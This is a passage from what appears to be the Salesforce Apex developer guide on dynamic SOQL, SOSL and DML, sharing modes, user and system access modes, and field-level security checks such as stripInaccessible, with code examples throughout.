limits, see Execution Governors and Limits on page 348. For a full description of SOQL query syntax, see Salesforce Object Query Language (SOQL) in the SOQL and SOSL Reference. You can use simple bind variables in dynamic SOQL query strings when using `Database.query` . Bind variables in the query must be within the scope of the database operation. The following is allowed:

```apex
String myTestString = 'TestName';
List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE Name =
:myTestString');
```

However, unlike inline SOQL, you can’t use bind variable fields in the query string with `Database.query` . The following example isn’t supported and results in a `Variable` `does` `not` `exist` error.

```apex
MyCustomObject__c myVariable = new MyCustomObject__c(field1__c ='TestField');
List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE field1__c
= :myVariable.field1__c');
```

You can instead resolve the variable field into a string and use the string in your dynamic SOQL query:

```apex
String resolvedField1 = myVariable.field1__c;
List<sObject> sobjList = Database.query('SELECT Id FROM MyCustomObject__c WHERE field1__c
=
:resolvedField1');
```

(API version 57.0 and later) Another option is to use the `Database.queryWithBinds` method. With this method, bind variables in the query are resolved from a Map parameter directly with a key, rather than from Apex code variables. This removes the need for the variables to be in scope when the query is executed. This example shows a SOQL query that uses a bind variable for an Account name; its value is passed in with the `acctBinds` Map.

```apex
Map<String, Object> acctBinds = new Map<String, Object>{'acctName' => 'Acme Corporation'};
```

```apex
List<Account> accts =
Database.queryWithBinds('SELECT Id FROM Account WHERE Name = :acctName',
acctBinds,
AccessLevel.USER_MODE);
```

These considerations apply when using the Map parameter in the `Database.queryWithBinds` method: Although map keys of type String are case-sensitive,the `queryWithBinds` method doesn’t support Map keys that differ only in case. In a `queryWithBinds` method, comparison of Map keys is case-insensitive. If duplicate Map keys exist, the method throws a runtime `QueryException` . This example throws this runtime exception: `System.QueryException:` `The` `bindMap` `consists` `of` `duplicate` `case-insensitive` `keys:` `[Acctname,` `acctName]` .

```apex
Map<String, Object> bindVars = new Map<String, Object>{'acctName' => 'Acme Corporation'};
bindVars.put('Acctname', 'Foo');
string query = 'Select Id from Contact where Name like :acctName';
```

```apex
List<Contact> contacts =
Database.queryWithBinds(query, bindVars, AccessLevel.USER_MODE);
```

Map keys must follow naming standards: they must start with an ASCII letter, can’t start with a number, must not use reserved keywords , and must adhere to variable naming requirements . Although currently supported, Salesforce recommends against using the dot notation with Map keys. SOQL injection is a technique by which a user causes your application to execute database methods you didn’t intend by passing SOQL statements into your code. This can occur in Apex code whenever your application relies on end-user input to construct a dynamic SOQL statement and you don’t handle the input properly. To prevent SOQL injection, use the `escapeSingleQuotes` method. This method adds the escape character (\) to all single quotation marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead of database commands. The Dynamic SOQL examples in this topic show how to use the `Database.query` and `Database.queryWithBinds` methods. These methods also use Dynamic SOQL: `Database.countQuery` and `Database.countQueryWithBinds` : Return the number of records that a dynamic SOQL query would return when executed. `Database.getQueryLocator` and `Database.getQueryLocatorWithBinds` : Create a `QueryLocator` object used in batch Apex or Visualforce. Apex Reference Guide : System.Database Methods

#### Dynamic SOSL

Dynamic SOSL refers to the creation of a SOSL string at run time with Apex code. Dynamic SOSL enables you to create more flexible applications. For example, you can create a search based on input from an end user, or update records with varying field names. To create a dynamic SOSL query at run time, use the search `query` method. For example:

```apex
List<List <sObject>> myQuery = search.query(SOSL_search_string);
```

The following example exercises a simple SOSL query string.

```apex
String searchquery='FIND\'Edge*\'IN ALL FIELDS RETURNING Account(id,name),Contact, Lead';
```

```apex
List<List<SObject>>searchList=search.query(searchquery);
```

Dynamic SOSL statements evaluate to a list of lists of sObjects, where each list contains the search results for a particular sObject type. The result lists are always returned in the same order as they were specified in the dynamic SOSL query. From the example above, the results from Account are first, then Contact, then Lead. The search `query` method can be used wherever an inline SOSL query can be used, such as in regular assignment statements and `for` loops. The results are processed in much the same way as static SOSL queries are processed. Dynamic SOSL queries have the same governor limits as static queries. For more information on governor limits, see Execution Governors and Limits on page 348. For a full description of SOSL query syntax, see Salesforce Object Search Language (SOSL) in the SOQL and SOSL Reference . To provide more context for records in search results, use the SOSL `WITH` `SNIPPET` clause. Snippets make it easier to identify the content you’re looking for. For information about how snippets are generated, see WITH SNIPPET in the SOQL and SOSL Reference . To use the SOSL `WITH` `SNIPPET` clause in a dynamic SOSL query at run time, use the `Search.find` method.

```apex
Search.SearchResults searchResults = Search.find(SOSL_search_string);
```

This example exercises a simple SOSL query string that includes a `WITH` `SNIPPET` clause. The example calls `System.debug()` to print the returned titles and snippets. Your code would display the titles and snippets in a Web page.

```apex
Search.SearchResults searchResults = Search.find('FIND \'test\' IN ALL FIELDS RETURNING
KnowledgeArticleVersion(id, title WHERE PublishStatus = \'Online\' AND Language = \'en_US\')
WITH SNIPPET (target_length=120)');
```

```apex
List<Search.SearchResult> articlelist = searchResults.get('KnowledgeArticleVersion');
```

```apex
for (Search.SearchResult searchResult : articleList) {
KnowledgeArticleVersion article = (KnowledgeArticleVersion) searchResult.getSObject();
System.debug(article.Title);
System.debug(searchResult.getSnippet());
}
```

SOSL injection is a technique by which a user causes your application to execute database methods you did not intend by passing SOSL statements into your code. A SOSL injection can occur in Apex code whenever your application relies on end-user input to construct a dynamic SOSL statement and you do not handle the input properly. To prevent SOSL injection, use the `escapeSingleQuotes` method. This method adds the escape character (\) to all single quotation marks in a string that is passed in from a user. The method ensures that all single quotation marks are treated as enclosing strings, instead of database commands.

#### Dynamic DML

In addition to querying describe information and building SOQL queries at runtime, you can also create sObjects dynamically, and insert them into the database using DML. To create a new sObject of a given type, use the `newSObject` method on an sObject token. Note that the token must be cast into a concrete sObject type (such as Account). For example:

```apex
// Get a new account
Account a = new Account();
```

```apex
// Get the token for the account
Schema.sObjectType tokenA = a.getSObjectType();
// The following produces an error because the token is a generic sObject, not an Account
// Account b = tokenA.newSObject();
// The following works because the token is cast back into an Account
Account b = (Account)tokenA.newSObject();
```

Though the sObject token `tokenA` is a token of Account, it is considered an sObject because it is accessed separately. It must be cast back into the concrete sObject type Account to use the `newSObject` method. For more information on casting, see Classes and Casting on page 118. You can also specify an ID with `newSObject` to create an sObject that references an existing record that you can update later. For example:

```apex
SObject s = Database.query('SELECT Id FROM account LIMIT 1')[0].getSObjectType().
newSObject([SELECT Id FROM Account LIMIT 1][0].Id);
```

See SObjectType Class . This example shows how to obtain the sObject token through the `Schema.getGlobalDescribe` method and then creates a new sObject using the `newSObject` method on the token. This example also contains a test method that verifies the dynamic creation of an account.

```apex
public class DynamicSObjectCreation {
```

```apex
public static sObject createObject(String typeName) {
Schema.SObjectType targetType = Schema.getGlobalDescribe().get(typeName);
if (targetType == null) {
```

```apex
// throw an exception
}
```

```apex
// Instantiate an sObject with the type passed in as an argument
//
at run time.
return targetType.newSObject();
}
}
```

```apex
@isTest
private class DynamicSObjectCreationTest {
```

```apex
static testmethod void testObjectCreation() {
```

```apex
String typeName = 'Account';
String acctName = 'Acme';
```

```apex
// Create a new sObject by passing the sObject type as an argument.
Account a = (Account)DynamicSObjectCreation.createObject(typeName);
System.assertEquals(typeName, String.valueOf(a.getSobjectType()));
// Set the account name and insert the account.
a.Name = acctName;
insert a;
```

```apex
// Verify the new sObject got inserted.
Account[] b = [SELECT Name from Account WHERE Name = :acctName];
system.assert(b.size() > 0);
```

```apex
}
}
```

Use the `get` and `put` methods on an object to set or retrieve values for fields using either the API name of the field expressed as a String, or the field's token. In the following example, the API name of the field `AccountNumber` is used:

```apex
SObject s = [SELECT AccountNumber FROM Account LIMIT 1];
Object o = s.get('AccountNumber');
s.put('AccountNumber', 'abc');
```

The following example uses the `AccountNumber` field's token instead:

```apex
Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.AccountNumber;
Sobject s = Database.query('SELECT AccountNumber FROM Account LIMIT 1');
s.put(dfr.getsObjectField(), '12345');
```

The Object scalar data type can be used as a generic data type to set or retrieve field values on an sObject. This is equivalent to the anyType field type. Note that the Object data type is different from the sObject data type, which can be used as a generic type for any sObject. Apex classes and triggers saved (compiled) using API version 15.0 and higher produce a runtime error if you assign a String value that is too long for the field. Apex supports populating foreign keys by name (or external ID) in the same way as the API. To set or retrieve the scalar ID value of a foreign key, use the `get` or `put` methods. To set or retrieve the record associated with a foreign key, use the `getSObject` and `putSObject` methods. Note that these methods must be used with the sObject data type, not Object. For example:

```apex
SObject c =
Database.query('SELECT Id, FirstName, AccountId, Account.Name FROM Contact LIMIT 1');
SObject a = c.getSObject('Account');
```

There is no need to specify the external ID for a parent sObject value while working with child sObjects. If you provide an ID in the parent sObject, it is ignored by the DML operation. Apex assumes the foreign key is populated through a relationship SOQL query, which always returns a parent object with a populated ID. If you have an ID, use it with the child object. For example, suppose that custom object C1 has a foreign key `C2__c` that links to a parent custom object C2. You want to create a C1 object and have it associated with a C2 record named 'AW Computing' (assigned to the value `C2__r` ). You do not need the ID of the 'AW Computing' record, as it is populated through the relationship of parent to child. For example:

```apex
insert new C1__c(Name = 'x', C2__r = new C2__c(Name = 'AW Computing'));
```

If you had assigned a value to the ID for `C2__r` , it would be ignored. If you do have the ID, assign it to the object ( `C2__c` ), not the record. You can also access foreign keys using dynamic Apex. The following example shows how to get the values from a subquery in a parent-to-child relationship using dynamic Apex:

```apex
String queryString = 'SELECT Id, Name, ' +
```

```apex
'(SELECT FirstName, LastName FROM Contacts LIMIT 1) FROM Account';
SObject[] queryParentObject = Database.query(queryString);
```

```apex
for (SObject parentRecord : queryParentObject){
```

```apex
Object ParentFieldValue = parentRecord.get('Name');
// Prevent a null relationship from being accessed
SObject[] childRecordsFromParent = parentRecord.getSObjects('Contacts');
if (childRecordsFromParent != null) {
```

```apex
for (SObject childRecord : childRecordsFromParent){
```

```apex
Object ChildFieldValue1 = childRecord.get('FirstName');
Object ChildFieldValue2 = childRecord.get('LastName');
System.debug('Account Name: ' + ParentFieldValue +
'. Contact Name: '+ ChildFieldValue1 + ' ' + ChildFieldValue2);
}
}
}
```

### Apex Security and Sharing Model

The Apex security model includes record-level, field-level, and object-level security mechanisms. You can control record-level security modes by using the `with` `sharing` , `without` `sharing` , and `inherited` `sharing` keywords on classes. Apex runs in user mode by default, which means that user permissions on objects and field-level security are respected. A user cannot run code that tries to access fields or objects that are hidden from the user. Other security mechanisms include the `Security.stripInaccessible()` method, and Field and SObject describe methods.

#### Versioned Behavior Changes

In API version 67.0 and later, you can’t use the `WITH` `SECURITY_ENFORCED` clause in SOQL `SELECT` queries in Apex code. Instead, use the `WITH` `USER_MODE` clause. In API version 67.0 and later, Apex runs in user context by default, meaning that the current user’s permissions and field-level security (FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default. In API version 67.0 and later, classes without an explicit sharing declaration run in `with` `sharing` mode. In API version 66.0 and earlier, the sharing mode of classes without an explicit sharing declaration is determined according these factors. If the class is part of an inheritance chain, and any class in that chain is saved as API version 67.0 and later, the class runs in `with` `sharing` mode. If the class is an Aura controller or an `@AuraEnabled` method called from a Lightning web component, the class runs in `with` `sharing` mode. If the class isn’t an Apex entry point, its sharing mode is defined by the sharing mode of the calling class. Otherwise, the class runs in `without` `sharing` mode. Enforce Sharing Rules In Apex, sharing rules are always enforced by default. Use the with sharing, without sharing, and inherited sharing keywords to control record-level security. If you don't want sharing rules to be enforced, then you must declare a class with the `without` `sharing` keyword. Enforce Object and Field Permissions Apex generally runs in user context by default, meaning that the current user’s permissions and field-level security (FLS) are enforced during code execution. To ignore the FLS and object permissions of the current user, you must explicitly set a database operation or query to run in system mode. For fine-grained control, you can check the current user’s permissions for an object or a field, and then perform a specific DML operation or a query only if the user has sufficient permissions. Class Security Understanding Apex Managed Sharing Sharing is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing access can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex. Security Tips for Apex and Visualforce Development Enforce Security with Field and SObject Describe Methods Apex Reference Guide : stripInaccessible()

#### Enforce Sharing Rules

In Apex, sharing rules are always enforced by default. Use the with sharing, without sharing, and inherited sharing keywords to control record-level security. If you don't want sharing rules to be enforced, then you must declare a class with the `without` `sharing` keyword. Apex code that is executed with the `executeAnonymous` call and Connect in Apex always execute using the sharing rules of the current user. See Anonymous Blocks on page 264. Sharing rules are distinct from, and can co-exist with object-level and field-level permissions. While `with` `sharing` is the default sharing mode, Salesforce recommends that you use keyword declarations on all your classes to make your code easier to maintain. For more information, see Use the with sharing, without sharing, and inherited sharing Keywords . Using the `with` `sharing` keyword doesn’t enforce the user’s permissions and field-level security. This example has two classes, the first class ( `CWith` ) enforces sharing rules while the second class ( `CWithout` ) doesn’t. The `CWithout` class calls a method from the first, which runs with sharing rules enforced. The `CWithout` class contains an inner class, in which code executes under the same sharing context as the caller. It also contains a class that extends it, which inherits its without sharing setting.

```apex
public with sharing class CWith {
```

```apex
// All code in this class operates with enforced sharing rules.
```

```apex
Account a = [SELECT . . . ];
```

```apex
public static void m() { . . . }
```

```apex
static {
. . .
}
```

```apex
{
. . .
}
```

```apex
public void c() {
. . .
}
}
```

```apex
public without sharing class CWithout {
```

```apex
// All code in this class ignores sharing rules and operates
// as if the context user has the Modify All Data permission.
```

```apex
Account a = [SELECT . . . ];
. . .
```

```apex
public static void m() {
. . .
```

```apex
// This call into CWith operates with enforced sharing rules
// for the context user. When the call finishes, the code execution
// returns to without sharing mode.
CWith.m();
}
```

```apex
public class CInner {
```

```apex
// All code in this class executes with the same sharing context
// as the code that calls it.
// Inner classes are separate from outer classes.
. . .
```

```apex
// Again, this call into CWith operates with enforced sharing rules
// for the context user, regardless of the class that initially called this inner
class.
// When the call finishes, the code execution returns to the sharing mode that was
used to call this inner class.
```

```apex
CWith.m();
}
```

```apex
public class CInnerWithOut extends CWithout {
```

```apex
// All code in this class ignores sharing rules because
// this class extends a parent class that ignores sharing rules.
}
}
```

Because a class declared as `with` `sharing` can call a class declared as `without` `sharing` , you may still have to implement class-level security. In addition, all SOQL and SOSL queries that use Pricebook2 ignore the `with` `sharing` keyword. All price books are returned, regardless of the applied sharing rules. Enforcing the current user's sharing rules can impact: SOQL and SOSL queries. A query can return fewer rows than it would operating in system context. DML operations. An operation can fail because the current user doesn't have the correct permissions. For example, if the user specifies a foreign key value that exists in the organization, but which the current user doesn’t have access to, then the DML operation fails. In API version 67.0 and later, classes without an explicit sharing declaration are run in the current user context. In API version 66.0 and earlier, for classes without an explicit sharing declaration, the current sharing rule remains in effect. Use the with sharing, without sharing, and inherited sharing Keywords Salesforce Help : Sharing Rules

#### Enforce Object and Field Permissions

Apex generally runs in user context by default, meaning that the current user’s permissions and field-level security (FLS) are enforced during code execution. To ignore the FLS and object permissions of the current user, you must explicitly set a database operation or query to run in system mode. For fine-grained control, you can check the current user’s permissions for an object or a field, and then perform a specific DML operation or a query only if the user has sufficient permissions. You can run database operations and SOQL queries in either user mode or system mode. See Set an Access Mode for Database Operations on page 216. You can also enforce object-level and field-level permissions in your code by explicitly calling the access control methods of the Schema.DescribeSObjectResult and the Schema.DescribeFieldResult classes. See Enforce Security with Field and SObject Describe Methods on page 221. Object-level and field-level permissions are distinct from sharing rules, which enforce specific record access. They can coexist. If sharing rules are defined in Salesforce, you can enforce them at the class level by declaring the class with the `with` `sharing` keyword. See Use the with sharing, without sharing, and inherited sharing Keywords . If you call the Schema.DescribeSObjectResult and Schema.DescribeFieldResult access control methods, the verification of object and field-level permissions is performed in addition to the sharing rules that are in effect. Sometimes, the access level granted by a sharing rule can conflict with an object-level or field-level permission. In that case, object-level and field-level permissions take precedence over sharing rules. Orgs with Experience Cloud sites enabled provide various settings to hide a user’s personal information from other users. See Manage Personal User Information Visibility and Share Personal Contact Information Within Experience Cloud Sites . These settings aren’t enforced in Apex, even with security features such as the `WITH` `USER_MODE` clause or the `stripInaccessible` method. To hide specific fields on the User object in Apex, follow the example code outlined in Comply with a User’s Personal Information Visibility Settings . Automated Process users can’t perform Object and FLS checks in custom code unless appropriate permission sets are explicitly applied to those users. In API version 67.0 and later, Apex runs in user context by default, meaning that the current user’s permissions and field-level security (FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default. Set an Access Mode for Database Operations Apex database operations run in user mode by default, which means that they apply the sharing rules, field-level security (FLS), and object permissions of the running user. Database operations only ignore FLS and object permissions if you explicitly set them to run in system mode. Enforce Security with the stripInaccessible Method Use the `stripInaccessible` method to enforce field-level and object-level data protection by stripping fields and relationship fields from query and subquery results that the user can’t access. The method can also be used to remove inaccessible sObject fields before DML operations to avoid exceptions and to sanitize sObjects that have been deserialized from an untrusted source. Enforce Security with Field and SObject Describe Methods At the most granular level, you can enforce object-level and field-level permissions in your code by explicitly calling the `Schema.DescribeSObjectResult` and the `Schema.DescribeFieldResult` methods to check the current user’s access permission levels. Salesforce Help : Set Up Your Users’ Object, User, and Field Permissions Apex database operations run in user mode by default, which means that they apply the sharing rules, field-level security (FLS), and object permissions of the running user. Database operations only ignore FLS and object permissions if you explicitly set them to run in system mode. If you set a database operation to user mode, the operation always respects the user’s sharing rules. However, if you set the operation to system mode, the sharing keyword on the calling class determines whether the operation respects the user’s record-level permissions. See Use the with sharing, without sharing, and inherited sharing Keywords . Set an Access Mode for SOQL and SOSL Queries To indicate an access mode for a SOQL or SOSL query, insert a `WITH` `USER_MODE` or `WITH` `SYSTEM_MODE` clause. This example specifies user mode in SOQL.

```apex
List<Account> acc = [SELECT Id FROM Account WITH USER_MODE];
```

In SOQL queries, user mode: Supports polymorphic fields, such as as `Owner` and `Task.whatId` . Processes all clauses in the SOQL `SELECT` statement including the `WHERE` clause. Finds all FLS errors in your SOQL query. Supports the `getInaccessibleFields()` method on QueryException to examine the full set of access errors. Set an Access Mode for DML Statements To indicate an access mode for a DML statement, insert the `as` `user` or `as` `system` keywords between the DML operator and the object name. This example inserts a new account in user mode.

```apex
Account acc = new Account(Name='test');
insert as user acc;
```

If you run DML operations in user mode, you can use the `DMLException` method `getDmlFieldNames()` to obtain the fields with FLS errors. Set an Access Mode for Database and Search Methods The `AccessLevel` class represents the two modes in which Apex runs database operations. Use this class to define the mode as user mode or system mode. An `accessLevel` parameter in Database and Search methods specifies whether the method runs in user mode ( `AccessLevel.USER_MODE` ) or system mode ( `AccessLevel.SYSTEM_MODE` ). These DML and query operations support the `accessLevel` parameter. `Database.query` method. See Dynamic SOQL . `Database.getQueryLocator` methods `Database.countQuery` method `Database.getCursor` method `Database.getPaginationCursor` method `Search.query` method Database DML methods ( `insert` , `update` , `upsert` , `merge` , `delete` , `undelete` , and `convertLead` ). Includes the `*Immediate` and `*Async` methods, such as `insertImmediate` and `deleteAsync` . If you run Database DML methods with `AccessLevel.USER_MODE` , you can access errors via `SaveResult.getErrors().getFields()` . These Database methods require the `accessLevel` parameter.

```apex
•
Database.queryWithBinds.
```

```apex
•
Database.getQueryLocatorWithBinds
```

```apex
•
Database.countQueryWithBinds
```

```apex
•
Database.getCursorWithBinds
```

```apex
•
Database.getPaginationCursorWithBinds
```

Use Permission Sets to Enforce Security in DML and Search Operations (Developer Preview) In Developer Preview, you can specify a permission set that to augment the field-level and object-level security for database and search operations. Run the `AccessLevel.withPermissionSetId()` method with a specified permission set ID. Specific user mode DML operations that are performed with that `AccessLevel` , respect the permissions in the specified permission set, in addition to the running user’s permissions. This example runs the `AccessLevel.withPermissionSetId()` method with the specified permission set and inserts a custom object.

```apex
@IsTest
public with sharing class ElevateUserModeOperations_Test {
```

```apex
@IsTest
static void objectCreatePermViaPermissionSet() {
Profile p = [
SELECT Id
FROM Profile
WHERE Name = 'Minimum Access - Salesforce'
];
User u = new User(
Alias = 'standt',
Email = 'standarduser@testorg.com',
EmailEncodingKey = 'UTF-8',
LastName = 'Testing',
LanguageLocaleKey = 'en_US',
LocaleSidKey = 'en_US',
ProfileId = p.Id,
TimeZoneSidKey = 'America/Los_Angeles',
UserName = 'standarduser' + DateTime.now().getTime() + '@testorg.com'
);
```

```apex
System.runAs(u) {
```

```apex
try {
Database.insert(new Account(name = 'foo'), AccessLevel.User_mode);
Assert.fail();
} catch (SecurityException ex) {
Assert.isTrue(ex.getMessage().contains('Account'));
}
//Get ID of previously created permission set named 'AllowCreateToAccount'
Id permissionSetId = [
SELECT Id
FROM PermissionSet
WHERE Name = 'AllowCreateToAccount'
LIMIT 1
]
.Id;
```

```apex
Database.insert(
```

```apex
new Account(name = 'foo'),
AccessLevel.User_mode.withPermissionSetId(permissionSetId)
);
```

```apex
// The elevated access level is not persisted to subsequent operations
try {
Database.insert(new Account(name = 'foo2'), AccessLevel.User_mode);
Assert.fail();
} catch (SecurityException ex) {
Assert.isTrue(ex.getMessage().contains('Account'));
}
}
}
}
```

Checkmarx, the AppExchange Security Review source code scanner, isn’t updated with this new Apex feature. Until it’s updated, Checkmarx can generate false positives for field or object-level security violations that require exception documentation. Versioned Behavior Changes In API version 67.0 and later, Apex runs in user context by default, meaning that the current user’s permissions and field-level security (FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default. Use the `stripInaccessible` method to enforce field-level and object-level data protection by stripping fields and relationship fields from query and subquery results that the user can’t access. The method can also be used to remove inaccessible sObject fields before DML operations to avoid exceptions and to sanitize sObjects that have been deserialized from an untrusted source. The `Security.stripInaccessible()` method takes a permission set ID as a parameter and enforces field-level and object-level access as per the specified permission set, in addition to the running user’s permissions. The method allows graceful degradation of the application by omitting fields, rather than failing outright, and is similar to the behavior with views, reports, and layouts. Developers can enforce security at the level of business processes, and not merely at the object, field, or row level. This approach allows coverage of a large number of platform features that pass records into Apex from potentially untrusted sources such as Apex REST, Lightning clients, and so on. The ID field is never stripped by the `stripInaccessible` method to avoid issues when performing DML on the result. Implementation Details The field-level and object-level data protection is accessed through the Security and SObjectAccessDecision classes. The access check is based on the field-level permission of the current user in the context of the specified operation—create, read, update, or upsert. The Security.stripInaccessible() method checks the source records for fields that don’t meet the field-level security check for the current user. The method also checks the source records for lookup or master-detail relationship fields to which the current user doesn’t have access. The method creates a return list of sObjects that is identical to the source records, except that the fields that are inaccessible to the current user are removed. The sObjects returned by the `getRecords` method contain records in the same order as the sObjects in the `sourceRecords` parameter of the `stripInaccessible` method. Considerations Use this feature for graceful degradation on errors by omitting fields, rather than failing outright. The `stripInaccessible` method doesn’t support AggregateResult SObject. If the source records are of AggregateResult SObject type, an exception is thrown. To enforce object and field permissions on the User object and hide a user’s personal information from other users in orgs with Experience Cloud sites, see Enforcing Object and Field Permissions . Examples These examples show several applications of the `stripInaccessible` method. This example code removes inaccessible fields from the query result. A display table for campaign data must always show the `BudgetedCost` . The `ActualCost` must be shown only to users who have permission to read that field.

```apex
SObjectAccessDecision securityDecision =
Security.stripInaccessible(AccessType.READABLE,
[SELECT Name, BudgetedCost, ActualCost FROM Campaign]
);
```

```apex
// Construct the output table
if (securityDecision.getRemovedFields().get('Campaign').contains('ActualCost')) {
```

```apex
for (Campaign c : securityDecision.getRecords()) {
//System.debug Output: Name, BudgetedCost
}
} else {
```

```apex
for (Campaign c : securityDecision.getRecords()) {
//System.debug Output: Name, BudgetedCost, ActualCost
}
}
```

This example code removes inaccessible fields from the subquery result. The user doesn’t have permission to read the `Phone` field of a Contacts object.

```apex
List<Account> accountsWithContacts =
[SELECT Id, Name, Phone,
(SELECT Id, LastName, Phone FROM Account.Contacts)
FROM Account];
```

```apex
// Strip fields that are not readable
```

```apex
SObjectAccessDecision decision = Security.stripInaccessible(
AccessType.READABLE,
accountsWithContacts);
```

```apex
// Print stripped records
```

```apex
for (Integer i = 0; i < accountsWithContacts.size(); i++)
{
System.debug('Insecure record access: '+accountsWithContacts[i]);
System.debug('Secure record access: '+decision.getRecords()[i]);
}
```

```apex
// Print modified indexes
```

```apex
System.debug('Records modified by stripInaccessible: '+decision.getModifiedIndexes());
```

```apex
// Print removed fields
```

```apex
System.debug('Fields removed by stripInaccessible: '+decision.getRemovedFields());
```

This example code removes inaccessible fields from sObjects before DML operations. The user who doesn’t have permission to create Rating for an Account can still create an Account. The method ensures that no Rating is set and doesn’t throw an exception.

```apex
List<Account> newAccounts = new List<Account>();
Account a = new Account(Name='Acme Corporation');
Account b = new Account(Name='Blaze Comics', Rating=’Warm’);
newAccounts.add(a);
newAccounts.add(b);
```

```apex
SObjectAccessDecision securityDecision = Security.stripInaccessible(
AccessType.CREATABLE, newAccounts);
```

```apex
// No exceptions are thrown and no rating is set
insert securityDecision.getRecords();
```

```apex
System.debug(securityDecision.getRemovedFields().get('Account')); // Prints "Rating"
System.debug(securityDecision.getModifiedIndexes()); // Prints "1"
```

This example code sanitizes sObjects that have been deserialized from an untrusted source. The user doesn’t have permission to update the `AnnualRevenue` of an Account.

```apex
String jsonInput =
'[' +
'{' +
'"Name": "InGen",' +
'"AnnualRevenue": "100"' +
'},' +
'{' +
'"Name": "Octan"' +
'}' +
']';
```

```apex
List<Account> accounts = (List<Account>)JSON.deserializeStrict(jsonInput,
List<Account>.class);
SObjectAccessDecision securityDecision = Security.stripInaccessible(
AccessType.UPDATABLE, accounts);
```

```apex
// Secure update
update securityDecision.getRecords(); // Doesn’t update AnnualRevenue field
System.debug(String.join(securityDecision.getRemovedFields().get('Account'), ', ')); //
Prints "AnnualRevenue"
System.debug(String.join(securityDecision.getModifiedIndexes(), ', ')); // Prints "0”
```

This example code removes inaccessible relationship fields from the query result. The user doesn’t have permission to insert the `Account__c` field, which is a lookup from MyCustomObject__c to Account.

```apex
// Account__c is a lookup from MyCustomObject__c to Account
@IsTest
public class TestCustomObjectLookupStripped {
```

```apex
@IsTest static void caseCustomObjectStripped() {
Account a = new Account(Name='foo');
insert a;
List<MyCustomObject__c> records = new List<MyCustomObject__c>{
```

```apex
new MyCustomObject__c(Name='Custom0', Account__c=a.id)
};
insert records;
records = [SELECT Id, Account__c FROM MyCustomObject__c];
SObjectAccessDecision securityDecision = Security.stripInaccessible
(AccessType.READABLE, records);
```

```apex
// Verify stripped records
System.assertEquals(1, securityDecision.getRecords().size());
for (SObject strippedRecord : securityDecision.getRecords()) {
System.debug('Id should be set as Id fields are ignored: ' +
strippedRecord.isSet('Id')); // prints true
System.debug('Lookup field FLS is not READABLE to running user,
```

```apex
should not be set: ' +
strippedRecord.isSet('Account__c')); // prints false
}
}
}
```

Versioned Behavior Changes In API version 67.0 and later, Apex runs in user context by default, meaning that the current user’s permissions and field-level security (FLS) are enforced during code execution. In API version 66.0 and earlier, system mode is the default. Apex Reference Guide : AccessType Enum Apex Reference Guide : Security Class Apex Reference Guide : SObjectAccessDecision Class At the most granular level, you can enforce object-level and field-level permissions in your code by explicitly calling the `Schema.DescribeSObjectResult` and the `Schema.DescribeFieldResult` methods to check the current user’s access permission levels. By using the Schema.DescribeSObjectResult methods and the Schema.DescribeFieldResult methods, you can verify that the current user has the necessary permissions and perform a specific DML operation or a query only if the user has sufficient permissions. For example, you can call the `isAccessible` , `isCreateable` , or `isUpdateable` methods of `Schema.DescribeSObjectResult` to verify whether the current user has read, create, or update access to an sObject, respectively. Similarly, `Schema.DescribeFieldResult` exposes these access control methods that you can call to check the current user’s read, create, or update access for a field. In addition, you can call the `isDeletable` method provided by `Schema.DescribeSObjectResult` to check if the current user has permission to delete a specific sObject. These examples call the access control methods. To check the field-level update permission of the contact's email field before updating it:

```apex
if (Schema.sObjectType.Contact.fields.Email.isUpdateable()) {
```

```apex
// Update contact phone number
}
```

To check the field-level create permission of the contact's email field before creating a new contact:

```apex
if (Schema.sObjectType.Contact.fields.Email.isCreateable()) {
```

```apex
// Create new contact
}
```

To check the field-level read permission of the contact's email field before querying for this field:

```apex
if (Schema.sObjectType.Contact.fields.Email.isAccessible()) {
Contact c = [SELECT Email FROM Contact WHERE Id= :Id];
}
```

To check the object-level permission for the contact before deleting the contact:

```apex
if (Schema.sObjectType.Contact.isDeletable()) {
```

```apex
// Delete contact
}
```

#### Class Security

You can specify which users can execute methods in a particular top-level class based on their user profile or permission sets. You can only set security on Apex classes, not on triggers. To set Apex class security from the class list page, see Set Apex Class Access from the Class List Page To set Apex class security from the class detail page, see Set Apex Class Access from the Class List Page To set Apex class security from a permission set: **1.** From Setup, enter `Permission` `Sets` in the `Quick` `Find` box, then select **Permission Sets** . **2.** Select a permission set. **3.** Click **Apex Class Access** . **4.** Click **Edit** . **5.** Select the Apex classes that you want to enable from the Available Apex Classes list and click **Add** , or select the Apex classes that you want to disable from the Enabled Apex Classes list and click **Remove** . **6.** Click **Save** . To set Apex class security from a profile: **1.** From Setup, enter `Profiles` in the `Quick` `Find` box, then select **Profiles** . **2.** Select a profile. **3.** In the Apex Class Access page or related list, click **Edit** . **4.** Select the Apex classes that you want to enable from the Available Apex Classes list and click **Add** , or select the Apex classes that you want to disable from the Enabled Apex Classes list and click **Remove** . **5.** Click **Save** .

#### Understanding Apex Managed Sharing

Sharing is the act of granting a user or group of users permission to perform a set of actions on a record or set of records. Sharing access can be granted using the Salesforce user interface and Lightning Platform, or programmatically using Apex. For more information on sharing, see Set Your Internal Organization-Wide Sharing Defaults in the Salesforce online help. Understanding Sharing Sharing enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact, Opportunity and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional access based on record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed sharing to grant additional access programmatically with Apex. Sharing a Record Using Apex Recalculating Apex Managed Sharing Sharing enables record-level access control for all custom objects, as well as many standard objects (such as Account, Contact, Opportunity and Case). Administrators first set an object’s organization-wide default sharing access level, and then grant additional access based on record ownership, the role hierarchy, sharing rules, and manual sharing. Developers can then use Apex managed sharing to grant additional access programmatically with Apex. Most sharing for a record is maintained in a related sharing object, similar to an access control list (ACL) found in other platforms. Types of Sharing Salesforce has the following types of sharing: **Managed Sharing** Managed sharing involves sharing access granted by Lightning Platform based on record ownership, the role hierarchy, and sharing rules: **Record Ownership** Each record is owned by a user or optionally a queue for custom objects, cases and leads. The record owner is automatically granted Full Access, allowing them to view, 